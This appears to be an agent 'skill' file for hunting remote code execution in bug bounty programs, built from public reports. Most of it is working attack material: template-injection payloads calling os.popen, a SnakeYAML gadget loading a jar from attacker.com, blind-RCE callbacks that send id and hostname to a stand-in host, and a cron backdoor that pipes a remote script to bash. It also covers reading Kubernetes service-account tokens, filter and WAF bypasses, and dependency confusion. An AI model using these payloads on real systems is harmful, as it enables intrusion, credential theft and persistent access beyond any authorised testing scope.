---
name: hunt-rce
description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on any target.
sources: github, hackerone_public
report_count: 67
---

## Crown Jewel Targets

RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload

**Why this class pays most:**
- Blast radius is infrastructure-wide, not user-scoped
- Proof-of-concept is unambiguous — shell output is undeniable
- Fix requires architectural changes, not just a patch
- Programs cannot afford false negatives on RCE

---

## Attack Surface Signals

### URL Patterns
```
/management-console/*
/admin/settings/*
/api/v*/exec
/api/v*/run
/webhook/*
/_internal/*
/import?url=
/render?template=
/preview?format=
```

### Response Headers / Tech Stack Signals
```
X-Powered-By: Express          # Node.js — npm dependency surface
X-Powered-By: Phusion Passenger
Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
```

### JavaScript / Frontend Signals
```javascript
// Look for these patterns in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput)
new Function(userInput)
document.write(unsafeData)
window.location = userControlled  // URL scheme bypass → JS execution
```

### Tech Stack Signals
| Signal | RCE Vector |
|--------|-----------|
| `nomad` in config UI | Template injection → `{{ ... }}` |
| `syslog-ng` config editable | Config injection → `program()` destination |
| `collectd` config editable | Plugin exec injection |
| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` |
| npm `package.json` internal scope | Dependency confusion |
| ingress-nginx annotations | Path field regex bypass |

---

## Step-by-Step Hunting Methodology

1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.

2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.

3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.

4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
   - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
   - REXML: submit billion-laughs / quadratic blowup XML

5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.

6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.

7. **Audit Kubernetes/cloud-native surfaces.** Run `kubectl` against any exposed API server. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.

8. **Test OAuth redirect URI and URL scheme handlers.** Mobile apps processing `javascript:` or `intent://` URIs via OAuth redirect may execute JavaScript. Try `javascript:alert(document.cookie)` and custom scheme URIs.

9. **Verify with out-of-band callbacks.** Never rely solely on visible output. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.

10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Always ask: "what can I reach from here?"

---

## Payload & Detection Patterns

### Template Injection Probes
```
# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
{{'7'*7}}
{{config}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# Nomad template injection (Go text/template)
{{ env "NOMAD_SECRET_ID" }}
{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}
{{ runscript "id" }}
```

### SnakeYAML RCE Gadget
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/exploit.jar"]
  ]]
]
```

### Ruby YAML / rdoc_options RCE
```yaml
--- !ruby/object:Gem::Installer
i: x
```

### Dependency Confusion Detection
```bash
# Find internal package names
grep -r '"name"' node_modules/ | grep '@internal\|@company\|@private'
# Check if public registry has higher version
npm view @target-company/internal-package version 2>/dev/null
```

### Ingress-nginx Path Injection
```
# In spec.rules.http.paths.path
/something)(;.*);#
# Results in nginx config injection
```

### Kubernetes Exposed API Check
```bash
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces
```

### Out-of-Band RCE Confirmation
```bash
# Payload to confirm blind RCE via DNS
curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
nslookup $(whoami).attacker.com
wget http://attacker.com/$(cat /etc/hostname)
```

### ActiveStorage Path Traversal → RCE
```
# Filename in upload request
filename="../../../../etc/cron.d/backdoor"
# Cron payload content
* * * * * root curl http://attacker.com/shell | bash
```

### Grep Patterns for Source Review
```bash
# Command injection sinks
grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .
grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .

# Template engine instantiation
grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .

# Unsafe YAML load
grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument
grep -rn "Yaml()\|new Yaml()" --include="*.java" .
```

---

## Common Root Causes

**1. Configuration-as-code with insufficient sanitization**
Administrators edit configuration files (syslog-ng, collectd, nomad) through web UIs. Developers assume admin == trusted, so they pass field values directly into config files that support execution primitives (`program()` destinations, exec plugins, template functions).

**2. Template engines in privileged contexts**
Go's `text/template`, Freemarker, Velocity, and Twig are used for system configuration rendering. When user-controlled strings reach these engines without sandboxing, arbitrary code follows.

**3. Dependency confusion / namespace squatting**
Internal packages published to private registries without locking the public registry namespace. Build systems that prefer public registries by default, or that fall through to public when the private registry lacks a package.

**4. Unsafe deserialization of YAML/XML**
Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML both support arbitrary object instantiation by default.

**5. Path traversal in file operation chains**
Filenames accepted from user input are used in filesystem operations without normalization. Rails ActiveStorage, file upload handlers, and rdoc generators trust the `filename` parameter.

**6. Assuming low-privilege roles can't reach execution contexts**
The GHES management console granted "Editor" roles access to configuration fields that touched shell execution. Developers assumed privilege boundaries existed at a higher architectural level.

**7. Missing input validation on infrastructure-facing fields**
Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings — but the downstream processor (nginx config generator, regex engine) interprets them as code.

---

## Bypass Techniques

### Bypass: Shell metacharacter filtering
```bash
# Blocked: ; | & ` $()
# Bypass using $IFS and encodings
cat${IFS}/etc/passwd
{cat,/etc/passwd}
$'\x63\x61\x74' /etc/passwd  # hex encoding
$(printf '\x63\x61\x74') /etc/passwd

# Newline injection when semicolons blocked
payload=$'\ncurl attacker.com\n'
```

### Bypass: URL scheme allowlist (javascript: blocked)
```
# Mobile apps often block javascript: but miss:
jAvAsCrIpT:alert(1)          # case variation
javascript&#58;alert(1)      # HTML entity
javascript:void(alert(1))    # void wrapper
intent://attacker.com#Intent;scheme=javascript;...
data:text/html,<script>alert(1)</script>
```

### Bypass: YAML safe_load / type restrictions
```yaml
# If !!java.* is blocked, try legitimate classes with side effects
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: 'ldap://attacker.com/a'
  autoCommit: true
# Or find allowlisted types with dangerous constructors
```

### Bypass: npm scope restrictions
```
# If @company/* is monitored, look for unscoped internal names
# e.g., "internal-utils" instead of "@company/internal-utils"
# Public registries serve unscoped packages first
```

### Bypass: Path traversal filters
```
# Basic filter bypass
../           → ..%2F → %2e%2e%2f → ....// 
# Double encoding
%252e%252e%252f
# Unicode normalization
..%c0%af  (overlong UTF-8)
# Null byte (older systems)
../../etc/passwd%00.jpg
```

### Bypass: Template injection with output filtering
```
# If {{ }} is sanitized on output but not evaluation:
{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
# Blind — use DNS callback instead of output
{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
```

### Bypass: WAF blocking `exec`, `system`, `popen`
```ruby
# Ruby
send(:system, "id")
method(:exec).call("id")
Kernel.send(:`, "id")
Object.const_get(:Kernel).system("id")
```

---

## Gate 0 Validation

Before writing the report, confirm all three:

**1. What can the attacker DO right now?**
You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.

**2. What does the victim LOSE?**
Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.

**3. Can it be reproduced in 10 minutes from scratch?**
Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.

---

## Real Impact Examples

**Scenario A: Management Console Role → Root Shell (Enterprise Server)**
An attacker with a low-privileged "Management Console Editor" account on a GitHub Enterprise Server instance identified that the syslog-ng configuration UI accepted a free-form "destination" field. By injecting a `program()` destination containing a reverse shell command, the attacker caused the syslog-ng daemon (running as root) to execute arbitrary OS commands upon log receipt. The same attack surface was independently found in collectd's exec plugin configuration and nomad's job template rendering — all reachable from the same editor role. Impact: full root compromise of the enterprise git server hosting all organization source code, secrets, and CI/CD pipelines.

**Scenario B: Dependency Confusion → RCE on Build Infrastructure**
A researcher enumerated internal npm package names by reviewing JavaScript bundles served from target CDN endpoints and public GitHub repositories belonging to a major payments platform. Several `@internal/*` scoped packages were referenced but not registered on the public npm registry. The researcher published higher-versioned packages with identical names containing a postinstall script that executed a canary callback. Within hours, the callback fired from multiple IP addresses belonging to the target's CI/CD build farm — confirming that every npm install on their build infrastructure executed attacker-controlled code. The same technique worked against a ride-sharing platform's internal tooling. Impact: arbitrary code execution on build servers with access to production deployment credentials and signing keys.

**Scenario C: Exposed Kubernetes API → Cluster Takeover**
During reconnaissance on a target's cloud infrastructure, a researcher discovered a publicly accessible Kubernetes API server (port 6443) with overly permissive RBAC. Using default service account tokens and unauthenticated API calls, the researcher enumerated running pods, retrieved secrets from the default namespace (including database credentials and third-party API keys), and demonstrated the ability to spawn privileged pods with `hostPID: true` — enabling full node compromise. The Kubernetes cluster managed the target's core production services. Impact: access to all stored secrets, ability to deploy malicious workloads, and pivot to every service in the cluster.